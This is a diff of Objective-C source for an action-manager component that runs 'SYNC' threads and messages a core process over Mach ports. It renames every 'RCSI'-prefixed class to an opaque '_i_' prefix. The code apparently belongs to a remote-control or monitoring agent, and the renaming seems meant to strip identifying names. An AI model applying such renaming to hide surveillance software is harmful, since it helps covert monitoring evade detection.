@@ -22,7 +22,7 @@
 
 NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
 
-@implementation RCSIActionManager
+@implementation _i_ActionManager
 
 @synthesize notificationPort;
 
@@ -60,7 +60,7 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
 #pragma mark Support methods
 #pragma mark -
 
-- (void)addThread:(RCSIThread*)aThread
+- (void)addThread:(_i_Thread*)aThread
 {
   int count = [mThreadArray count] - 1;
   
@@ -153,8 +153,8 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
         }
       else
         {
-          RCSIThread *actionThread =  
-                  [[RCSIThread alloc] initWithTarget: self
+          _i_Thread *actionThread =  
+                  [[_i_Thread alloc] initWithTarget: self
                                             selector: @selector(triggerAction:) 
                                               object: [configArray retain]
                                              andName: @"SYNC"];
@@ -332,7 +332,7 @@ NSString *kRunLoopActionManagerMode = @"kRunLoopActionManagerMode";
 
 - (BOOL)actionInfo: (NSMutableDictionary *)aConfiguration
 {
-  RCSIInfoManager *infoManager = [[RCSIInfoManager alloc] init];
+  _i_InfoManager *infoManager = [[_i_InfoManager alloc] init];
 
   NSData *conf = [aConfiguration objectForKey: @"data"];
 
@@ -407,7 +407,7 @@ typedef struct _coreMessage_t
   NSData *msgData = [[NSData alloc] initWithBytes: &params 
                                            length: sizeof(shMemoryLog)];
   
-  [RCSISharedMemory sendMessageToCoreMachPort: msgData 
+  [_i_SharedMemory sendMessageToCoreMachPort: msgData 
                                      withMode: kRunLoopActionManagerMode];
   
   [msgData release];
@@ -540,7 +540,7 @@ typedef struct _coreMessage_t
 
 - (BOOL)start
 {  
-  actionsList = [[RCSIConfManager sharedInstance] actionsArrayConfig];
+  actionsList = [[_i_ConfManager sharedInstance] actionsArrayConfig];
   
   if (actionsList == nil)
     return FALSE;
